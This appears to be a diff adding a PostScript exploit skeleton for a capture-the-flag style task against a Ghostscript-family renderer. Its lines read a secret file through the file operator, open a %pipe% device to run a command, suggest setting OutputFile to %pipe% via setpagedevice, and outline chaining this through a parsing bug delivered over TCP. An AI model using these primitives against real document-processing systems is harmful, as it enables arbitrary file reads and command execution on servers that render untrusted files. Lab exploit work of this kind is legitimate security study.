@@ -1,0 +1,18 @@
+%!PS
+%% ghostscript-family skeleton: verify script-level primitives EARLY.
+%% Local: run through the fuzz target's rendering path, then deliver raw.
+
+%% STEP 1: can we run operators at all? (file device read = READ objective)
+(/secret) (r) file dup 65535 string readstring closefile
+% wrap in a writer that emits to a place you can observe (e.g. %pipe% or page)
+
+%% STEP 2: command execution door (EXEC objective) — OutputFile / %pipe%
+(%pipe%/usr/local/bin/catflag) (w) file
+%% If OutputFile-style params are settable from content, prefer:
+%%   << /OutputFile (%pipe%/usr/local/bin/catflag) >> setpagedevice
+
+%% STEP 3: chain through the GIVEN vulnerability (required by the task):
+%% reach the buggy parsing path with this PS as payload so the crash-grade
+%% primitive is part of the chain, then complete the exec above.
+
+%% Deliver: the README's TCP framing, then read back the flag.
